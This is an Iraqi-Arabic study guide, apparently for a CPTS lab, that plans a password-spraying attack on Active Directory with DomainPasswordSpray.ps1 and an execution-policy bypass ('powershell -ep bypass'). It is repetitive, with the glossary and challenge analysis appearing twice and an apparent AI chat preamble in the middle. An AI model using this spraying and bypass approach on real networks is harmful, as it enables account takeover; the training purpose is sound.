PowerShell Execution Policy (سياسة تنفيذ سكريبتات باورشيل)

- شنو يعني؟ باورشيل هي لغة برمجة وأداة تحكم قوية جداً موجودة بكل نظام ويندوز. لأنها خطرة والمخترقين يحبوها، مايكروسوفت حطت بيها ميزة أمان بسيطة تمنع تشغيل أي "سكريبت" (ملف أوامر جاهز) خارجي إلا بشروط. هاي السياسة مو جدار حماية حقيقي، هي مجرد حزام أمان لمنع المستخدمين العاديين من تدمير حاسباتهم بالغلط، ومن السهل جداً على المخترق تجاوزها (Bypass).
    
- وين يظهر بالأدوات/الأوامر؟ تظهر لما نحاول نشغل أداة ويفشل النظام، فنضطر نستخدم أوامر التجاوز مثل `powershell -ep bypass`.
    
- مثال بسيط: مثل القفل البلاستيكي الصغير اللي ينحط على أغطية العلب الطبية حتى الأطفال ما يفتحوها بالغلط. لكن أي شخص بالغ يكدر يكسر هذا القفل بثانية ويفتح العلبة.
    

Module / .ps1 (وحدة برمجية / سكريبت باورشيل)

- شنو يعني؟ ملف الامتداد مالته `.ps1` يحتوي بداخله على مجموعة من دوال وأوامر باورشيل الجاهزة. بدل ما المخترق يكتب مئات الأسطر المعقدة بإيده كل مرة، يحفظها بهذا الملف، ويستدعيها وقت الحاجة (Import). الوحدة البرمجية ترتب الشغل وتخليه سهل الاستخدام.
    
- وين يظهر بالأدوات/الأوامر؟ نستدعيه دائماً بالأمر `Import-Module` داخل نافذة الباورشيل قبل ما نبدأ الهجوم.
    
- مثال بسيط: صندوق عدة جاهز (Toolbox) تشتريه من السوق. بدل ما تصنع الدرنفيس والچاكوج بنفسك، تشتري الصندوق وتفتحه وتستخدم الأدوات الجاهزة اللي بداخله مباشرة.
    

LDAP (Lightweight Directory Access Protocol) (بروتوكول الوصول الخفيف للدليل)

- شنو يعني؟ هو اللغة أو البروتوكول اللي تتواصل بيه الحواسيب مع الـ Active Directory. إذا ردت تسأل الـ DC: "انطيني قائمة بكل الموظفين"، سؤالك هذا راح يروح عبر الشبكة باستخدام بروتوكول LDAP (غالباً على بورت ٣٨٩).
    
- وين يظهر بالأدوات/الأوامر؟ يعمل في الخلفية بشكل صامت بأغلب أدوات استكشاف بيئة ويندوز.
    
- مثال بسيط: مثل لغة التخاطب بينك وبين دليل الهواتف (البدالة). أنت تحجي لغة معينة تطلب بيها رقم شخص، والبدالة تفهمك وترجعلك الجواب.
    

Constrained Language Mode / CLM (وضع اللغة المقيد)

- شنو يعني؟ هذا مستوى متقدم من الحماية داخل باورشيل. إذا مدير الشبكة فعّل هذا الوضع، فراح يمنع باورشيل من استخدام الكثير من الدوال والقدرات العميقة اللي يحتاجها المخترق (مثل التلاعب بالذاكرة أو الاتصال بالـ API مال الويندوز). تجاوز الـ CLM أصعب بكثير من تجاوز الـ Execution Policy العادية.
    
- وين يظهر بالأدوات/الأوامر؟ يظهر كرسالة خطأ مرعبة لما تحاول تنفذ سكريبت معقد وتتفاجأ أن النظام يكولك "غير مسموح بسبب القيود".
    
- مثال بسيط: تخيل انطوك سيارة رياضية سريعة جداً (باورشيل)، بس خلوا بيها جهاز يحدد سرعتها بحيث ما تكدر تمشي أكثر من ٢٠ كيلومتر بالساعة. السيارة موجودة وشغالة، بس قدراتها الخطيرة مقفولة ومقيدة.
    

━━━━━

🟡 المرحلة 2: تحليل التحدي + كيف تفكر

خلينا نترجم ونفكك المعطيات اللي عندنا بالتحدي حبة حبة، ونشوف شلون راح نربط بينها حتى نرسم خريطة الهجوم (Roadmap). بدون تخطيط، راح نتخبط.

📖 ترجمة التحدي:

أنت هسة مخترق نجحت باختراق حاسبة عادية اسمها `ACADEMY-EA-MS01` (هذا اسم الجهاز، ومثل ما اتفقنا كجزء من أمان الشبكة راح نفترض الـ IP مالته الداخلي هو `192.168.50.100`).

الوصول اللي تملكه حالياً هو حساب مستخدم عادي جداً وصلاحياته ضعيفة اسمه `htb-student` والباسورد مالته هو `Academy_student_AD!`.

أنت كاعد على هاي الحاسبة داخل الشبكة (عن طريق بروتوكول RDP للاتصال عن بعد). يعني أنت هسة موجود فعلياً داخل القلعة، وتمتلك باج دخول رسمي وإن كان محدود الصلاحيات.

الهدف أو المهمة (المطلوب): مدير الشبكة غبي أو الموظفين كسولين، وأنت عندك معلومة خطيرة تكول إنه اكو شخص (أو عدة أشخاص) داخل الدومين كاعدين يستخدمون كلمة المرور الضعيفة جداً `Winter2022`. المطلوب منك هو معرفة: منو هو هذا المستخدم؟ شنو اسمه؟

🎯 معطيات السيناريو الثابتة:

- بيئة الهدف: شبكة Active Directory (بيئة Windows بامتياز).
    
- حالة المخترق: موجود داخل الشبكة، على جهاز منضم للمجال (Domain-Joined)، ويمتلك بيانات اعتماد صالحة لمستخدم عادي (htb-student).
    
- المعلومة الذهبية: كلمة مرور ثابتة ومؤكدة (`Winter2022`) نبحث عن صاحبها.
    
- القيود: يجب الحذر التام من التسبب بقفل حسابات الموظفين (Account Lockout) لأن هذا راح يخرب العملية كلها وينبه الحراس (Blue Team).
    

🧭 كيف تفكر؟ — خريطة اتخاذ القرار (Decision Tree):

بما أنك داخل شبكة Windows AD كطالب CPTS، عقلك لازم يشتغل كالتالي لما تواجه هيك موقف:

السؤال الأول: هل أني أمتلك Hash (بصمة مشفرة) وأريد أسوي تسجل دخول؟

الجواب: لا، ما عندي Hash. عندي كلمة مرور صريحة (Cleartext). إذن هجمات مثل Pass-the-Hash (PTH) ما تفيدني هنا.

السؤال الثاني: هل هدفي هو اصطياد حسابات الخدمات (Service Accounts) اللي تمتلك صلاحيات عالية عن طريق التذاكر؟

الجواب: لا، السيناريو ما ذكر أي شيء يخص الـ SPNs أو استهداف خدمات معينة. أنا أبحث عن يوزر بشري عادي استخدم باسورد موسمية. إذن تقنية Kerberoasting تطلع من الحسابات حالياً.

السؤال الثالث: هل أحتاج أحلل صلاحيات الشبكة المعقدة وارسم خريطة للمسارات اللي توديني للـ Domain Admin؟

الجواب: مو هسة. أداة BloodHound ممتازة لجمع البيانات، بس هسة هدفي محدد وبسيط: أريد أطابق الباسورد `Winter2022` ويا اسم مستخدم. إذا شغلت BloodHound راح أضيع وقتي ببيانات ما أحتاجها بهذي اللحظة الدقيقة.

السؤال الرابع: عندي باسورد واحد.. وعندي آلاف اليوزرات.. وأريد أطابقهم بدون ما أسوي ضجة وبدون ما أقفل حساباتهم. شنو التقنية المناسبة؟

الجواب القطعي: تقنية رش كلمات المرور (Password Spraying). هذي هي الاستراتيجية المثالية الوحيدة لهذا الموقف.

الآن، بعد ما حددنا الاستراتيجية (الرش)، لازم نحدد "الأداة" (Tool).

بما أنه أنت كاعد داخل حاسبة ويندوز أصلاً (عبر الـ RDP)، فالطريق الأقل مقاومة (Path of least resistance) والأكثر ذكاءً هو أن تستخدم الأدوات الموجودة بنظام الويندوز نفسه (Living off the Land). لغة PowerShell هي صديقك الصدوق هنا.

لو حاولنا نسوي سكربت رش بإيدنا من الصفر، راح نواجه مشكلة كارثية: شلون راح نعرف سياسة قفل الحسابات بالشركة؟ إذا رشينا بدون ما نعرف، ممكن نقفل الحسابات.

لذلك، أفضل خيار هو استخدام أداة جاهزة ومبرمجة بذكاء. الأداة اللي راح نستخدمها اسمها `DomainPasswordSpray.ps1`.

ليش هاي الأداة بالذات؟

لأنها مو مجرد أداة غبية تجرب الباسوردات. هاي الأداة تسوي شغلات عبقرية بالترتيب:

١. تستخدم بروتوكول LDAP وتستجوب الـ Domain Controller حتى تسحب قائمة بـ **كل** مستخدمين الدومين بشكل أوتوماتيكي ومخفي (ما تحتاج تكتبهم أنت).

٢. تقرأ سياسة قفل الحسابات (Lockout Policy) من الدومين، وتعرف بالضبط شكد مسموح إلها تغلط، والمدة الزمنية للقفل.

٣. تستبعد بشكل تلقائي أي مستخدم باقي له محاولة واحدة وينقفل حسابه! (حتى تحميك من ارتكاب الأخطاء وفضح نفسك).

٤. بعد كل هالفحوصات الأمنية لنفسها، تبدأ ترش الباسورد بهدوء تام.

🗺️ خريطة الهجوم (Roadmap):

حسب تحليلنا، هاي هي الخطوات المرتبة اللي راح نتبعها بالتفصيل (هنا بس تخطيط، التنفيذ بالمرحلة الجاية):

١. راح نفتح نافذة أوامر باورشيل (PowerShell) على جهاز الضحية اللي احنا متصلين بيه.

٢. راح نستدعي ونحمل الأداة الخبيثة `DomainPasswordSpray.ps1` داخل الجلسة مالتنا.

٣. إذا واجهتنا مشكلة أو حماية من النظام تمنع تشغيل الأداة (Execution Policy)، راح نطبق تقنيات التجاوز (Bypass) حتى نجبر النظام يطيع أوامرنا.

٤. راح نطلق أمر الهجوم والرش، ونوجه الأداة تستخدم الباسورد `Winter2022` وتخفي أي رسائل خطأ حمراء مزعجة حتى تبقى الشاشة نظيفة ونركز بس على النجاح.

٥. راح نقرأ ملف النتائج اللي ولدته الأداة، ونحصل على اسم المستخدم المطلوب (وهو بمثابة الـ Flag مالتنا).

جهّز نفسك، لأن بالمرحلة الجاية راح نفتح التيرمنال ونبدأ نكتب أوامر حقيقية وننفذ هذا التخطيط خطوة بخطوة. راح ننتقل من التنظير إلى الاختراق الفعلي.




تمام! استلمت التحدي. خلني أشرحلك إياه من الألف للياء:

🟢 Big Picture → 🔵 المصطلحات → 🟡 تحليل التحدي → 🟠 الاستغلال → 🔴 ماذا لو → 💎 فلاشكاردز → 📄 ورقة غش

يله نبدأ...

توثيق وتجهيز هالمعلومات وترتيبها بملفات الـ Obsidian مالتك هسة، راح يخليك جاهز تماماً وتختصر عليك هواي مراجعات حتى تعبر امتحان الـ CPTS بنهاية سنة التفرغ بكل ثقة. هذا السيناريو هو أساسي جداً بشغل الـ Red Teaming.

━━━━━

🟢 المرحلة 0: ما قبل الصفر — Big Picture

⚠️ تذكر دائماً: الفهم يسبق التطبيق. إذا حفظت الأوامر بدون ما تفهم ليش كاعد نكتبها، راح توكف بأول مطب يواجهك بالواقع.

تخيل وياي السيناريو التالي: أنت هسة موظف أمن سيبراني، أو خلينا نكول أنت مختبر اختراق (Penetration Tester) كاعد داخل شبكة شركة ضخمة. هاي الشركة بيها آلاف الموظفين. كل موظف عنده حاسبة، وكلهم مربوطين بشبكة وحدة مركزية يتحكم بيها سيرفر عظيم اسمه الـ Domain Controller. هذا السيرفر هو "عقل" الشركة، وهو اللي يقرر منو يدخل ومنو ينمنع بناءً على اسم المستخدم وكلمة المرور مالتهم.

هسة، الشركات دائماً تفرض سياسات معقدة لكلمات المرور. تكول للموظف: "لازم الباسورد مالتك يكون بيه حرف كبير، ورقم، ورمز، ولازم تغيره كل ٩٠ يوم". الموظف البسيط، اللي ما يهمه الأمن السيبراني بكد ما يهمه يخلص شغله ويرجع لبيته، راح يدور على أسهل طريقة يلتف بيها على هاي القوانين المعقدة حتى ما ينسى الباسورد. فشراح يسوي؟ راح يستخدم كلمات مرور موسمية يسهل تذكرها وتطابق الشروط بنفس الوقت. مثلاً، إذا أحنا بفصل الشتاء وسنة ٢٠٢٢، راح يخلي الباسورد مالته `Winter2022`. وإذا بالصيف راح يخليه `Summer2023!`. هاي ظاهرة بشرية نفسية بحتة، والمخترقين يعرفوها كلش زين ويبنون هجماتهم على أساسها.

في الزمن القديم، المخترقين كانوا يستخدمون أسلوب "القوة العمياء" (Brute Force). يعني المخترق يجيب اسم مستخدم واحد (مثلاً مدير النظام Administrator) ويجيب قائمة بيها ملايين كلمات المرور، ويبدأ يجربها كلها على هذا المستخدم المكسين. باسورد ورا باسورد، ومئات المحاولات بالثانية.

لكن مسؤولي الحماية مو نايمين. انتبهوا لهالشي وسووا آلية دفاعية اسمها "سياسة قفل الحساب" (Account Lockout Policy). هاي السياسة تكول: "إذا شخص حاول يدخل الباسورد غلط ٥ مرات متتالية، اقفل الحساب مالته لمدة نص ساعة، ونزّل تنبيه أحمر يم مسؤول الحماية".

هنا المخترقين انصدموا بواقع جديد. إذا أظل أجرب ملايين الباسوردات على يوزر واحد، من خامس محاولة راح ينقفل الحساب، وتفشل العملية، وانكشف، وينطرد اليوزر من شغله لحد ما يخابر الدعم الفني. يعني استراتيجية القوة العمياء التقليدية ماتت وانتهت بالشبكات الحديثة.

فشلون المخترق الذكي يتعامل ويا هاي الآلية الدفاعية؟ شلون نكدر نخترق حسابات بدون ما نقفلها وبدون ما نثير أي انتباه؟

الجواب هو قلب التحدي مالتنا اليوم: هجوم رش كلمات المرور (Password Spraying).

الفكرة هنا هي أن نقلب المعادلة تماماً. بدل ما نثبت "اسم المستخدم" ونجرب عليه آلاف "كلمات المرور" (وهذا يسبب القفل)، راح نثبت "كلمة مرور وحدة فقط" (مثل كلمة `Winter2022` اللي متأكدين اكو موظف كسول استخدمها)، ونجربها على "آلاف المستخدمين" بالشركة.

يعني نروح للموظف الأول: نجرب `Winter2022`.. فشل؟ نعوفه ونروح للثاني.

الموظف الثاني: نجرب `Winter2022`.. فشل؟ نعوفه ونروح للثالث.

شنو اللي سويناه هسة؟

أولاً: جربنا محاولة واحدة فاشلة فقط لكل مستخدم، يعني ما وصلنا للحد الأقصى مال القفل (اللي هو مثلاً ٥ محاولات). الحسابات كلها بقت شغالة وسليمة.

ثانياً: الأنظمة الأمنية ما راح تكتشف هذا الهجوم بسهولة، لأنها مصممة تدور على "محاولات فشل متكررة على حساب واحد"، ومو مصممة تدور على "محاولة فشل واحدة متوزعة على آلاف الحسابات". أنت كاعد تمشي تحت الرادار (Low and Slow).

ثالثاً: لأننا كاعد نستخدم كلمة مرور موسمية ومنتشرة وضعيفة، نسبة النجاح مالتنا شبه مؤكدة في الشركات الكبيرة. مستحيل من بين ٢٠٠٠ موظف ما نلگي واحد على الأقل استخدم هذا الباسورد السهل.

هذا التحدي يقع ضمن مجال "رفع الصلاحيات والحركة الجانبية داخل بيئة Active Directory". أنت بالفعل كدرت تخترق حاسبة عادية، وعندك يوزر عادي وصلاحياته ضعيفة. هدفك هسة مو تخترق الحاسبة نفسها، بل تستخدم هاي الحاسبة كنقطة انطلاق (Pivot) حتى تستجوب الشبكة كلها، تسحب أسماء كل الموظفين، وترش عليهم هالباسورد الضعيف، عسى ولعل يطيح بيدك حساب مال مدير أو شخص عنده صلاحيات أعلى بكثير من صلاحياتك الحالية، وتكدر من خلاله تسيطر على الشبكة بالكامل.

شنو راح نتعلم بالنهاية من هذا التحدي؟

١. كيف نفهم عقلية المدافعين وكيف نتلاعب بقواعدهم الأمنية (مثل سياسة القفل) لصالحنا.

٢. كيف نستخدم أدوات باورشيل (PowerShell) اللي تعتبر من أخطر الأسلحة المتاحة لأنها موجودة أصلاً بكل حاسبات الويندوز (Living off the Land).

٣. كيف نستخرج قائمة بجميع مستخدمين الشبكة بشكل أوتوماتيكي ومخفي بدون ما نضطر نكتبهم بيدنا واحد واحد.

━━━━━

🔵 المرحلة 1: المصطلحات

مثل ما اتفقنا، ما راح نعبر أي مصطلح غريب بدون ما نفلشه تفليش حتى تفهمه بعمق وتكدر تشرحه لأي شخص يمر عليك. اقرأ هالمصطلحات بتركيز لأنها الأساس اللي راح نبني عليه استغلالنا.

Active Directory / AD (الدليل النشط)

- شنو يعني؟ هو اختراع من شركة مايكروسوفت، وهو عبارة عن قاعدة بيانات ضخمة ونظام إدارة مركزي يستخدم بالشركات. تخيل انه سجل مدني كامل لكل شيء بالشركة: كل موظف (User)، كل حاسبة (Computer)، كل طابعة، وكل مجموعة صلاحيات. الدليل النشط هو اللي يقرر منو يدخل لوين وشنو يكدر يسوي.
    
- وين يظهر بالأدوات/الأوامر؟ يظهر دائماً لما نتعامل ويا بيئة الـ Domain، مثل أوامر استخراج البيانات أو بالـ BloodHound أو أي أداة تستهدف شبكات مايكروسوفت.
    
- مثال بسيط: مثل موظف الاستعلامات اللي بباب الشركة، عنده دفتر بيه أسماء كل الموظفين وصلاحياتهم. من تجي تريد تدخل لغرفة معينة، يشيك الدفتر مالته (الـ AD) ويشوف مسموح لك لو لا.
    

Domain Controller / DC (متحكم المجال)

- شنو يعني؟ هو السيرفر (الخادم) الفعلي اللي يشتغل عليه نظام الـ Active Directory. هو القلب النابض للشبكة والملك المتوج مالتها. إذا كدرت تخترق الـ DC وتصير أدمن عليه، أنت فعلياً احتليت الشركة بالكامل وتكدر تسوي أي شيء يعجبك.
    
- وين يظهر بالأدوات/الأوامر؟ يظهر بالـ flags اللي تحدد الهدف، مثل `-dc-ip` في أدوات بايثون أو لما نستجوب الشبكة.
    
- مثال بسيط: إذا كان الـ AD هو الدفتر اللي بيه القوانين، فالـ DC هو المدير العنيف اللي كاعد على الكرسي يطبق هاي القوانين ويطرد المخالفين.
    

Password Spraying (رش كلمات المرور)

- شنو يعني؟ هو هجوم أفقي. يعني نأخذ كلمة مرور واحدة ضعيفة بس محتملة جداً (مثل اسم الشركة وسنة التأسيس، أو فصول السنة)، ونجربها على كل أسماء المستخدمين الموجودين بالشركة بمحاولة واحدة فقط لكل مستخدم. الهدف منه تجاوز سياسات الحماية اللي تقفل الحسابات.
    
- وين يظهر بالأدوات/الأوامر؟ يظهر بأسماء الأدوات المخصصة لهذا الغرض مثل `DomainPasswordSpray.ps1` أو أدوات مثل `CrackMapExec` أو `NetExec` لما نمرر الها ملف يوزرات ويا باسورد واحد.
    
- مثال بسيط: عندك مفتاح واحد لونه ذهبي، وعندك ألف باب مقفول. بدل ما تظل تجرب ألف مفتاح على باب واحد وتكسر القفل، تروح تجرب هذا المفتاح الذهبي مرة وحدة على كل الألف باب، أكيد واحد بيهم راح يفتح.
    

Brute Force (هجوم القوة العمياء)

- شنو يعني؟ هو هجوم عمودي. نأخذ اسم مستخدم واحد فقط (مثلاً Administrator)، ونجرب عليه آلاف أو ملايين كلمات المرور بسرعة خيالية. هذا الأسلوب مزعج جداً، يسوي ضجة بالشبكة (Logs)، ويؤدي دائماً إلى قفل الحساب الهدف بسرعة، ولذلك هو غير مفضل بالشبكات الداخلية الحديثة.
    
- وين يظهر بالأدوات/الأوامر؟ يظهر بأدوات كسر كلمات المرور مثل Hydra أو أوضاع معينة في Hashcat.
    
- مثال بسيط: شخص يحاول يفتح خزنة حديدية، فيجيب مطرقة ويظل يضرب بيها بكل قوته لحد ما تنكسر أو يخرب القفل نهائياً.
    

Account Lockout Policy (سياسة قفل الحساب)

- شنو يعني؟ هي إعدادات أمنية يفرضها مدير الشبكة لحماية الحسابات من الاختراق والتخمين المستمر. تتكون عادة من عنصرين: الأول "Lockout Threshold" (حد القفل) يعني كم مرة مسموح لك تغلط بالباسورد قبل ما ينقفل حسابك (مثلاً ٣ أو ٥ مرات). والثاني "Observation Window" (نافذة المراقبة) وهي المدة اللي النظام يحسب بيها هالأغلاط، والمدة اللي يبقى بيها الحساب مقفول (مثلاً ينقفل لمدة ٣٠ دقيقة).
    
- وين يظهر بالأدوات/الأوامر؟ أدوات الرش الذكية مثل أداة اليوم تقرأ هاي السياسة بشكل تلقائي قبل ما تبدأ الهجوم حتى تعرف شكد مسموح الها تغلط.
    
- مثال بسيط: جهاز الصراف الآلي (ATM). إذا دخلت الرمز مالتك غلط ٣ مرات، الصراف يبلع البطاقة مالتك ويقفل حسابك كإجراء أمني.
    

Domain-Joined Machine (جهاز منضم للمجال)

- شنو يعني؟ يعني حاسبة عادية (مثل حاسبة أي موظف) بس تم ربطها وإضافتها رسمياً إلى شبكة الشركة (الـ Domain). أهمية هذا الشيء للمخترق هي أن هاي الحاسبة تمتلك علاقة "ثقة" (Trust) مع سيرفر الشركة المركزي. وبالتالي تكدر تستجوب الشبكة وتطلب معلومات منها بدون ما النظام يرفضك.
    
- وين يظهر بالأدوات/الأوامر؟ مجرد كونك داخل حاسبة متصلة يعني تكدر تستخدم أوامر الويندوز العادية مثل `net user /domain` لاستخراج البيانات.
    
- مثال بسيط: موظف لابس الباج الرسمي مال الشركة ويتمشى بالممرات. حتى لو كان عامل نظافة (صلاحيات قليلة)، السكيورتي ما راح يشك بيه لأن عنده باج رسمي ومرخص يتواجد داخل المبنى.
    

PowerShell Execution Policy (سياسة تنفيذ سكريبتات باورشيل)

- شنو يعني؟ باورشيل هي لغة برمجة وأداة تحكم قوية جداً موجودة بكل نظام ويندوز. لأنها خطرة والمخترقين يحبوها، مايكروسوفت حطت بيها ميزة أمان بسيطة تمنع تشغيل أي "سكريبت" (ملف أوامر جاهز) خارجي إلا بشروط. هاي السياسة مو جدار حماية حقيقي، هي مجرد حزام أمان لمنع المستخدمين العاديين من تدمير حاسباتهم بالغلط، ومن السهل جداً على المخترق تجاوزها (Bypass).
    
- وين يظهر بالأدوات/الأوامر؟ تظهر لما نحاول نشغل أداة ويفشل النظام، فنضطر نستخدم أوامر التجاوز مثل `powershell -ep bypass`.
    
- مثال بسيط: مثل القفل البلاستيكي الصغير اللي ينحط على أغطية العلب الطبية حتى الأطفال ما يفتحوها بالغلط. لكن أي شخص بالغ يكدر يكسر هذا القفل بثانية ويفتح العلبة.
    

Module / .ps1 (وحدة برمجية / سكريبت باورشيل)

- شنو يعني؟ ملف الامتداد مالته `.ps1` يحتوي بداخله على مجموعة من دوال وأوامر باورشيل الجاهزة. بدل ما المخترق يكتب مئات الأسطر المعقدة بإيده كل مرة، يحفظها بهذا الملف، ويستدعيها وقت الحاجة (Import). الوحدة البرمجية ترتب الشغل وتخليه سهل الاستخدام.
    
- وين يظهر بالأدوات/الأوامر؟ نستدعيه دائماً بالأمر `Import-Module` داخل نافذة الباورشيل قبل ما نبدأ الهجوم.
    
- مثال بسيط: صندوق عدة جاهز (Toolbox) تشتريه من السوق. بدل ما تصنع الدرنفيس والچاكوج بنفسك، تشتري الصندوق وتفتحه وتستخدم الأدوات الجاهزة اللي بداخله مباشرة.
    

LDAP (Lightweight Directory Access Protocol) (بروتوكول الوصول الخفيف للدليل)

- شنو يعني؟ هو اللغة أو البروتوكول اللي تتواصل بيه الحواسيب مع الـ Active Directory. إذا ردت تسأل الـ DC: "انطيني قائمة بكل الموظفين"، سؤالك هذا راح يروح عبر الشبكة باستخدام بروتوكول LDAP (غالباً على بورت ٣٨٩).
    
- وين يظهر بالأدوات/الأوامر؟ يعمل في الخلفية بشكل صامت بأغلب أدوات استكشاف بيئة ويندوز.
    
- مثال بسيط: مثل لغة التخاطب بينك وبين دليل الهواتف (البدالة). أنت تحجي لغة معينة تطلب بيها رقم شخص، والبدالة تفهمك وترجعلك الجواب.
    

Constrained Language Mode / CLM (وضع اللغة المقيد)

- شنو يعني؟ هذا مستوى متقدم من الحماية داخل باورشيل. إذا مدير الشبكة فعّل هذا الوضع، فراح يمنع باورشيل من استخدام الكثير من الدوال والقدرات العميقة اللي يحتاجها المخترق (مثل التلاعب بالذاكرة أو الاتصال بالـ API مال الويندوز). تجاوز الـ CLM أصعب بكثير من تجاوز الـ Execution Policy العادية.
    
- وين يظهر بالأدوات/الأوامر؟ يظهر كرسالة خطأ مرعبة لما تحاول تنفذ سكريبت معقد وتتفاجأ أن النظام يكولك "غير مسموح بسبب القيود".
    
- مثال بسيط: تخيل انطوك سيارة رياضية سريعة جداً (باورشيل)، بس خلوا بيها جهاز يحدد سرعتها بحيث ما تكدر تمشي أكثر من ٢٠ كيلومتر بالساعة. السيارة موجودة وشغالة، بس قدراتها الخطيرة مقفولة ومقيدة.
    

━━━━━

🟡 المرحلة 2: تحليل التحدي + كيف تفكر

خلينا نترجم ونفكك المعطيات اللي عندنا بالتحدي حبة حبة، ونشوف شلون راح نربط بينها حتى نرسم خريطة الهجوم (Roadmap). بدون تخطيط، راح نتخبط.

📖 ترجمة التحدي:

أنت هسة مخترق نجحت باختراق حاسبة عادية اسمها `ACADEMY-EA-MS01` (هذا اسم الجهاز، ومثل ما اتفقنا كجزء من أمان الشبكة راح نفترض الـ IP مالته الداخلي هو `192.168.50.100`).

الوصول اللي تملكه حالياً هو حساب مستخدم عادي جداً وصلاحياته ضعيفة اسمه `htb-student` والباسورد مالته هو `Academy_student_AD!`.

أنت كاعد على هاي الحاسبة داخل الشبكة (عن طريق بروتوكول RDP للاتصال عن بعد). يعني أنت هسة موجود فعلياً داخل القلعة، وتمتلك باج دخول رسمي وإن كان محدود الصلاحيات.

الهدف أو المهمة (المطلوب): مدير الشبكة غبي أو الموظفين كسولين، وأنت عندك معلومة خطيرة تكول إنه اكو شخص (أو عدة أشخاص) داخل الدومين كاعدين يستخدمون كلمة المرور الضعيفة جداً `Winter2022`. المطلوب منك هو معرفة: منو هو هذا المستخدم؟ شنو اسمه؟

🎯 معطيات السيناريو الثابتة:

- بيئة الهدف: شبكة Active Directory (بيئة Windows بامتياز).
    
- حالة المخترق: موجود داخل الشبكة، على جهاز منضم للمجال (Domain-Joined)، ويمتلك بيانات اعتماد صالحة لمستخدم عادي (htb-student).
    
- المعلومة الذهبية: كلمة مرور ثابتة ومؤكدة (`Winter2022`) نبحث عن صاحبها.
    
- القيود: يجب الحذر التام من التسبب بقفل حسابات الموظفين (Account Lockout) لأن هذا راح يخرب العملية كلها وينبه الحراس (Blue Team).
    

🧭 كيف تفكر؟ — خريطة اتخاذ القرار (Decision Tree):

بما أنك داخل شبكة Windows AD كطالب CPTS، عقلك لازم يشتغل كالتالي لما تواجه هيك موقف:

السؤال الأول: هل أني أمتلك Hash (بصمة مشفرة) وأريد أسوي تسجل دخول؟

الجواب: لا، ما عندي Hash. عندي كلمة مرور صريحة (Cleartext). إذن هجمات مثل Pass-the-Hash (PTH) ما تفيدني هنا.

السؤال الثاني: هل هدفي هو اصطياد حسابات الخدمات (Service Accounts) اللي تمتلك صلاحيات عالية عن طريق التذاكر؟

الجواب: لا، السيناريو ما ذكر أي شيء يخص الـ SPNs أو استهداف خدمات معينة. أنا أبحث عن يوزر بشري عادي استخدم باسورد موسمية. إذن تقنية Kerberoasting تطلع من الحسابات حالياً.

السؤال الثالث: هل أحتاج أحلل صلاحيات الشبكة المعقدة وارسم خريطة للمسارات اللي توديني للـ Domain Admin؟

الجواب: مو هسة. أداة BloodHound ممتازة لجمع البيانات، بس هسة هدفي محدد وبسيط: أريد أطابق الباسورد `Winter2022` ويا اسم مستخدم. إذا شغلت BloodHound راح أضيع وقتي ببيانات ما أحتاجها بهذي اللحظة الدقيقة.

السؤال الرابع: عندي باسورد واحد.. وعندي آلاف اليوزرات.. وأريد أطابقهم بدون ما أسوي ضجة وبدون ما أقفل حساباتهم. شنو التقنية المناسبة؟

الجواب القطعي: تقنية رش كلمات المرور (Password Spraying). هذي هي الاستراتيجية المثالية الوحيدة لهذا الموقف.

الآن، بعد ما حددنا الاستراتيجية (الرش)، لازم نحدد "الأداة" (Tool).

بما أنه أنت كاعد داخل حاسبة ويندوز أصلاً (عبر الـ RDP)، فالطريق الأقل مقاومة (Path of least resistance) والأكثر ذكاءً هو أن تستخدم الأدوات الموجودة بنظام الويندوز نفسه (Living off the Land). لغة PowerShell هي صديقك الصدوق هنا.

لو حاولنا نسوي سكربت رش بإيدنا من الصفر، راح نواجه مشكلة كارثية: شلون راح نعرف سياسة قفل الحسابات بالشركة؟ إذا رشينا بدون ما نعرف، ممكن نقفل الحسابات.

لذلك، أفضل خيار هو استخدام أداة جاهزة ومبرمجة بذكاء. الأداة اللي راح نستخدمها اسمها `DomainPasswordSpray.ps1`.

ليش هاي الأداة بالذات؟

لأنها مو مجرد أداة غبية تجرب الباسوردات. هاي الأداة تسوي شغلات عبقرية بالترتيب:

١. تستخدم بروتوكول LDAP وتستجوب الـ Domain Controller حتى تسحب قائمة بـ **كل** مستخدمين الدومين بشكل أوتوماتيكي ومخفي (ما تحتاج تكتبهم أنت).

٢. تقرأ سياسة قفل الحسابات (Lockout Policy) من الدومين، وتعرف بالضبط شكد مسموح إلها تغلط، والمدة الزمنية للقفل.

٣. تستبعد بشكل تلقائي أي مستخدم باقي له محاولة واحدة وينقفل حسابه! (حتى تحميك من ارتكاب الأخطاء وفضح نفسك).

٤. بعد كل هالفحوصات الأمنية لنفسها، تبدأ ترش الباسورد بهدوء تام.

🗺️ خريطة الهجوم (Roadmap):

حسب تحليلنا، هاي هي الخطوات المرتبة اللي راح نتبعها بالتفصيل (هنا بس تخطيط، التنفيذ بالمرحلة الجاية):

١. راح نفتح نافذة أوامر باورشيل (PowerShell) على جهاز الضحية اللي احنا متصلين بيه.

٢. راح نستدعي ونحمل الأداة الخبيثة `DomainPasswordSpray.ps1` داخل الجلسة مالتنا.

٣. إذا واجهتنا مشكلة أو حماية من النظام تمنع تشغيل الأداة (Execution Policy)، راح نطبق تقنيات التجاوز (Bypass) حتى نجبر النظام يطيع أوامرنا.

٤. راح نطلق أمر الهجوم والرش، ونوجه الأداة تستخدم الباسورد `Winter2022` وتخفي أي رسائل خطأ حمراء مزعجة حتى تبقى الشاشة نظيفة ونركز بس على النجاح.

٥. راح نقرأ ملف النتائج اللي ولدته الأداة، ونحصل على اسم المستخدم المطلوب (وهو بمثابة الـ Flag مالتنا).

جهّز نفسك، لأن بالمرحلة الجاية راح نفتح التيرمنال ونبدأ نكتب أوامر حقيقية وننفذ هذا التخطيط خطوة بخطوة. راح ننتقل من التنظير إلى الاختراق الفعلي.